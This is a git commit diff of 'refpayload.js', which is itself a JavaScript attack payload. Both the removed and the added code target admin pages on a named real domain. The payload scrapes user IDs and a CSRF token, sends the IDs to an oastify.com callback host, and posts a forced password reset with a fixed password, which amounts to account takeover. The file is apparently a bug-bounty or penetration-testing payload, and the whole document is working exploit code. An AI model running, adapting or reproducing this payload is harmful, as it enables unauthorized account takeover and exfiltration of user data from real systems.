bf9ead36e1820bc388640572034c2351340f8cba
tomoncrss <tonymyson89823@gmail.com>
2025-02-13 17:07:11 +0330

    Update refpayload.js

--- refpayload.js
+++ refpayload.js
@@ -1,15 +1,21 @@
-for (let i = 199234; i <= 199237; i++) {
-  fetch(`https://refeng.erad.com/Admin/AdminUsers/Edit?aUserKey=${i}`)
-    .then(res => res.text())
-    .then(res => {
-      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
-      if (match) {
-        fetch(`https://7v38ezsvngwu5goi5lsma1v25tbkzb4zt.oastify.com?data=${encodeURIComponent(match[1])}`);
-      }
-      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
-      });
-    });
-}
+fetch("https://refeng.erad.com/Admin/AdminUsers/Edit?aUserKey=25713")  
+  .then(res => res.text())  
+  .then(res => {  
+    // Extract CSRF token  
+    const tokenMatch = res.match(/__RequestVerificationToken" type="hidden" value="([^"]+)"/);  
+    const token = tokenMatch ? tokenMatch[1] : "";  
+
+    // Extract User ID  
+    const userIdMatch = res.match(/<span class="blue-cursive" id='UserIDText'>(.*?)<\/span>/);  
+    const userId = userIdMatch ? userIdMatch[1] : "";  
+
+    // Send extracted User ID  
+    fetch(`https://7v38ezsvngwu5goi5lsma1v25tbkzb4zt.oastify.com?data=${encodeURIComponent(userId)}`);  
+
+    // Change password using extracted token  
+    fetch("https://refeng.erad.com/Home/PasswordReset", {  
+      method: "POST",  
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },  
+      body: `__RequestVerificationToken=${encodeURIComponent(token)}&NewPassword=Test@123@12&ConfirmPassword=Test@123@12&returnUrl=%2F`  
+    });  
+  });
